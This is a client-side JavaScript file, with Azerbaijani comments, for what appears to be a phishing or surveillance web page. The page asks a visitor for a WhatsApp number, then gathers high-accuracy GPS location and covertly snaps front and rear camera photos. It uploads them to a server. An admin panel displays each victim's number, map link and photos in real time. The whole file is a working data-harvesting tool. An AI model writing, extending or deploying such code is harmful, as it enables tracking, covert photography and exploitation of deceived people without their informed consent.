// Socket.IO bağlantısı
const socket = io();

// Global dəyişənlər
let phoneNumber = '';
let userData = {
    phone: '',
    location: null,
    frontImage: null,
    backImage: null,
    timestamp: null
};

// Admin Modal
function openAdminPanel() {
    document.getElementById('adminModal').classList.add('active');
}

function closeAdminPanel() {
    document.getElementById('adminModal').classList.remove('active');
}

// Admin Giriş
async function adminLogin() {
    const username = document.getElementById('adminUsername').value;
    const password = document.getElementById('adminPassword').value;
    const errorElement = document.getElementById('loginError');
    
    if (!username || !password) {
        errorElement.textContent = 'Zəhmət olmasa bütün xanaları doldurun!';
        return;
    }
    
    try {
        const response = await fetch('/api/admin/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        });
        
        const result = await response.json();
        
        if (result.success) {
            document.getElementById('adminLogin').style.display = 'none';
            document.getElementById('adminDashboard').style.display = 'block';
            loadAdminData();
        } else {
            errorElement.textContent = 'Yanlış istifadəçi adı və ya şifrə!';
        }
    } catch (error) {
        errorElement.textContent = 'Xəta baş verdi, yenidən cəhd edin!';
    }
}

// Admin məlumatlarını yüklə
async function loadAdminData() {
    try {
        const response = await fetch('/api/admin/data');
        const result = await response.json();
        
        if (result.success) {
            displayUserData(result.data);
        }
    } catch (error) {
        console.error('Məlumatlar yüklənə bilmədi:', error);
    }
}

// İstifadəçi məlumatlarını göstər
function displayUserData(data) {
    const totalUsersElement = document.getElementById('totalUsers');
    const userDataListElement = document.getElementById('userDataList');
    
    totalUsersElement.textContent = data.length;
    userDataListElement.innerHTML = '';
    
    data.reverse().forEach((user, index) => {
        const userCard = document.createElement('div');
        userCard.className = 'user-card';
        
        const timestamp = new Date(user.timestamp).toLocaleString('az-AZ');
        
        userCard.innerHTML = `
            <h3>İstifadəçi #${data.length - index}</h3>
            <div class="user-info">
                <div class="info-row">
                    <span class="info-label">WhatsApp:</span>
                    <span class="info-value">+994 ${user.phone}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Tarix:</span>
                    <span class="info-value">${timestamp}</span>
                </div>
                ${user.location ? `
                <div class="info-row">
                    <span class="info-label">Konum:</span>
                    <span class="info-value">
                        Lat: ${user.location.latitude.toFixed(6)}, 
                        Lng: ${user.location.longitude.toFixed(6)}
                        <br>
                        <a href="https://www.google.com/maps?q=${user.location.latitude},${user.location.longitude}" target="_blank" style="color: #667eea; text-decoration: none;">
                            📍 Xəritədə Bax
                        </a>
                    </span>
                </div>
                ` : ''}
                ${user.frontImage || user.backImage ? `
                <div class="info-row">
                    <span class="info-label">Şəkillər:</span>
                    <div class="image-preview">
                        ${user.frontImage ? `<img src="${user.frontImage}" alt="Önlü kamera">` : ''}
                        ${user.backImage ? `<img src="${user.backImage}" alt="Arxalı kamera">` : ''}
                    </div>
                </div>
                ` : ''}
            </div>
        `;
        
        userDataListElement.appendChild(userCard);
    });
}

// Real-time yeniləmə
socket.on('new-user-data', (data) => {
    // Admin paneli açıqdırsa, məlumatları yenilə
    const dashboard = document.getElementById('adminDashboard');
    if (dashboard.style.display === 'block') {
        loadAdminData();
    }
});

// Telefon nömrəsini göndər
function submitPhone() {
    const phoneInput = document.getElementById('phoneInput');
    const phone = phoneInput.value.trim();
    
    if (phone.length !== 9 || !/^\d{9}$/.test(phone)) {
        alert('Zəhmət olmasa düzgün telefon nömrəsi daxil edin! (9 rəqəm)');
        return;
    }
    
    phoneNumber = phone;
    userData.phone = phone;
    
    // Səhifə 2-yə keçid
    document.getElementById('page1').classList.remove('active');
    document.getElementById('page2').classList.add('active');
}

// İcazələri istə və məlumatları topla
async function requestPermissions() {
    showLoading();
    
    try {
        // 1. Konum icazəsi al
        const location = await getLocation();
        userData.location = location;
        
        // 2. Kamera icazəsi və şəkil çək
        const images = await captureImages();
        userData.frontImage = images.front;
        userData.backImage = images.back;
        
        // 3. Məlumatları göndər
        await sendUserData();
        
        // 4. Uğur ekranını göstər
        hideLoading();
        showThankYou();
        
    } catch (error) {
        hideLoading();
        alert('Xəta baş verdi: ' + error.message);
        console.error('Error:', error);
    }
}

// Konum əldə et
function getLocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject(new Error('Brauzeriniz konum dəstəkləmir'));
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                // İstifadəçi icazə verməsə belə davam et
                console.warn('Konum icazəsi verilmədi:', error);
                resolve(null);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });
}

// Şəkilləri çək
async function captureImages() {
    try {
        const images = {
            front: null,
            back: null
        };
        
        // Önlü kamera
        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' }
            });
            images.front = await captureFromStream(frontStream);
        } catch (error) {
            console.warn('Önlü kamera icazəsi verilmədi:', error);
        }
        
        // Arxalı kamera
        try {
            const backStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }
            });
            images.back = await captureFromStream(backStream);
        } catch (error) {
            console.warn('Arxalı kamera icazəsi verilmədi:', error);
        }
        
        return images;
    } catch (error) {
        console.warn('Kamera icazəsi verilmədi:', error);
        return { front: null, back: null };
    }
}

// Stream-dən şəkil çək
function captureFromStream(stream) {
    return new Promise((resolve) => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        video.onloadedmetadata = () => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Stream-i bağla
                stream.getTracks().forEach(track => track.stop());
                
                resolve(imageData);
            }, 500);
        };
    });
}

// Məlumatları serverə göndər
async function sendUserData() {
    try {
        const response = await fetch('/api/submit-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
        
        const result = await response.json();
        
        if (!result.success) {
            throw new Error('Məlumatlar göndərilə bilmədi');
        }
    } catch (error) {
        throw new Error('Server xətası');
    }
}

// Yükləmə ekranı
function showLoading() {
    document.getElementById('loadingScreen').classList.add('active');
}

function hideLoading() {
    document.getElementById('loadingScreen').classList.remove('active');
}

// Təşəkkür ekranı
function showThankYou() {
    document.getElementById('thankYouScreen').classList.add('active');
    
    // 3 saniyədən sonra səhifəni yenilə
    setTimeout(() => {
        location.reload();
    }, 3000);
}

// Telefon inputu formatla
document.getElementById('phoneInput')?.addEventListener('input', function(e) {
    this.value = this.value.replace(/[^0-9]/g, '');
});

// Enter düyməsi ilə davam et
document.getElementById('phoneInput')?.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        submitPhone();
    }
});

// Admin parol inputu üçün Enter
document.getElementById('adminPassword')?.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        adminLogin();
    }
});
